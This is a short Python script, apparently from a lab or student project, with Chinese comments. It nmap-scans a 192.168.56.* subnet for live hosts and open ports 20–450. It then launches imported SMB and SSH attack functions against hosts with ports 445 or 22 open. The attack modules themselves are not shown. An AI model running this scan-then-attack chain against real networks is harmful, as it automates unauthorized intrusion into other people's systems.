from python_nmap_scan import nmap_ip_scan, nmap_port_scan
from python_ssh import ssh_attack
from python_smb import smb_attack

def main():
    ip = '192.168.56.*'
    # 掃描網域中有活動的主機
    ip_list = nmap_ip_scan(ip)
    for i in ip_list:
        print(i + " status is up")

    # 對在線的主機掃描tcp port
    host_port_os = nmap_port_scan(ip_list, "20-450")
    for j in host_port_os:
        print(j)

    # 對有開啟port 22 445 服務的主機執行ssh smb攻擊
    for j in host_port_os:
        ip_list = list(j.keys())
        for ip in ip_list:
            if j.get(ip).get("tcp_port").get(445):
                # 對有開啟port 445 服務的主機，檢測目標是否存在符合漏洞
                smb_attack(ip)

            if j.get(ip).get("tcp_port").get(22):
                # 對tcp port 22 執行ssh攻擊
                ssh_attack(ip)

if __name__ == '__main__':
    main()